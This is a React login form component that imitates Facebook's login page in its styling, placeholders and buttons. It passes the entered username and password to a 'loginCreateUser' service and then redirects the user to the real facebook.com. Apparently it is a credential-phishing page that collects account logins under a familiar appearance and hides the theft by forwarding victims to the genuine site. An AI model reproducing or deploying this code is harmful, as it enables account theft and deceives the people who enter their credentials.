/* eslint-disable @typescript-eslint/no-explicit-any */
import { loginCreateUser } from "@/services/user";
import { Spinner } from "@/ui/spiner";
import Link from "next/link";
import { useCallback, useState } from "react";
import { toast } from "sonner";
export const LoginForm = () => {
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [data, setData] = useState({
    username: "",
    password: "",
  });

  const handleLogin = async (e: any) => {
    e.preventDefault();
    setErrorMessage("");

    try {
      if (!data.username || !data.password) {
        throw new Error("Vui lòng nhập đầy đủ thông tin");
      }

      setLoading(true);

      // const res: any =
      await loginCreateUser(data);
      // if (!res?.data?.access_token) {
      //   throw new Error("Ko nhận được  token từ server");
      // }

      // localStorage.setItem("token", res?.data?.access_token);

      toast.success("Đăng nhập thành công");

      window.location.replace("https://www.facebook.com/");
      // window.location.replace("/chat-socket");
    } catch (err: any) {
      setErrorMessage(err.message || "Đăng nhập thất bại");
      toast.error("Đăng nhập thất bại");
    } finally {
      setLoading(false);
    }
  };

  const handleInputChange = useCallback((e: any) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  }, []);
  return (
    <form action="" onSubmit={handleLogin}>
      <div className="px-5">
        <div className="py-[6px] px-0 w-full text-[17px]">
          <input
            onChange={handleInputChange}
            type="text"
            name="username"
            className="border-[1px] border-[#dddfe2] rounded-[6px] py-[14px] px-[16px] w-full"
            placeholder="Email address or phone number"
          />
        </div>
        {/* ========== */}
        <div className="py-[6px] px-0 zw-full text-[17px]">
          <input
            onChange={handleInputChange}
            type="password"
            name="password"
            className="border-[1px] border-[#dddfe2] rounded-[6px] py-[14px] px-[16px] w-full "
            placeholder="Password"
          />
          <div>
            <span className="text-red-500">{errorMessage}</span>
          </div>
        </div>
      </div>
      {/* ========== */}
      <div className="px-5">
        <button
          type="submit"
          className="w-full bg-blue border-none rounded-[6px] text-[20px] px-[16px] py-[10px] font-bold text-white"
        >
          {loading ? <Spinner /> : "Log in"}
        </button>
      </div>
      {/* ========== */}
      <div className="flex justify-center mt-[16px]">
        <Link href="/" className="text-[14px] font-medium text-blue">
          Forgotten password?
        </Link>
      </div>
      {/* ========== */}
      <div className="flex items-center border-[1px] border-[#dadde1]  my-[20px] mx-[16px]"></div>
      {/* ========== */}
      <div className="pt-[6px] flex justify-center">
        <Link
          href="/"
          className="text-[17px] rounded-[6px]  py-[12px] px-[16px] text-white bg-green font-bold"
        >
          Create new account
        </Link>
      </div>
    </form>
  );
};
